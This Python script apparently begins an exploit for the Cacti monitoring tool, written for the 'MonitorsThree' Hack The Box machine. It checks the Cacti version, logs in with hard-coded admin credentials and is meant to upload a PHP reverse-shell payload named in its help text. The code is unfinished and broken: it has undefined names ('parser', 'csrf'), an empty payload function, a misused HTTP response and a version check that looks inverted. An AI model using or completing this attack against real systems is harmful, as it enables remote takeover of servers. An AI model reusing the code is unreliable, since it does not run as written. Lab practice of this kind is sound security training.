#!/usr/bin/env python3

'''
Author: Declan Middleton
License: MIT
github: https://github.com/declanmiddleton
linkedin: https://www.linkedin.com/in/declanmiddleton/
youtube: https://youtube.com/@declanmidd
HackTheBox: declanmiddleton

Made for MonitorsThree HTB
'''

import os
import ssl
import argparse
import urllib3
import urllib.request
import certifi
from bs4 import BeautifulSoup

banner = '''
░▀█▀░█░█░█▀█░█▀▄░█▀█░░░░█▀▄░█▀▄░█▀█░█▀█
░░█░░█▀█░█░█░█▀▄░█░█░░░░█░█░█▀▄░█░█░█▀▀
░░▀░░▀░▀░▀▀▀░▀░▀░▀░▀░░░░▀▀░░▀░▀░▀▀▀░▀░░
'''
print(banner)

# =========================
# HTTP setup
# =========================
http = urllib3.PoolManager(
    cert_reqs='CERT_REQUIRED',
    ca_certs=certifi.where()
)

http_proxy = {'127.0.0.1': 8080}

# =========================
# User input
# =========================
cacti_url = input('[>] Enter cacti url: ')
session = urllib3.request(cacti_url)

# =========================
# Functions
# =========================
def check_cacti_version(version_check):
    print('[+] Checking cacti version')
    r = http.request(version_check)
    r.text

    if 'Cacti CHANGELOG' in r and '1.2.26' not in r:
        print('[+] Valid version!')
    else:
        print('[-] Invalid version, not going to work..')


def auth_login():
    print('[+] Valid version, attempting login')
    auth = urllib.request.HTTPBasicAuthHandler()
    auth.add_password(
        realm='Cacti',
        uri=cacti_url,
        user='admin',
        passwd='greencacti2001'
    )
    opener = urllib.request.build_opener(auth)
    urllib.request.install_opener(opener)

    with urllib.request.urlopen(cacti_url) as f:
        print(f.read().decode('utf-8'))


def payload():
    pass


# =========================
# Main
# =========================
if __name__ == '__main__':
    cli_parser = argparse.ArgumentParser(
        epilog='''Examples:
                ./thorn.py http://localhost/cacti admin password
                ./thorn.py -p './php/rev.php' http://localhost/cacti admin password''',
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('URL',type=str,help='Cacti URL')
    parser.add_argument('username',type=str,help='Login username')
    parser.add_argument('password',type=str,help='Login password')
    parser.add_argument('-p','--payload',type=str,help='Path to the PHP payload file (default: `./payload/shell.php` is a reverse shell created by pentestmonkey, Don\'t forget to change the ip & port)',default='./payload/shell.php')
    args = parser.parse_args()

    URL = args.URL
    username = args.username
    password = args.password
    filename = args.payload
    
    
    

print('[*] Uploading payload')


data = {
    '__csrf_magic': csrf,
    'action': 'login',
    'login_username': username,
    'login_password': password,
    'remember_me': 'on'
}
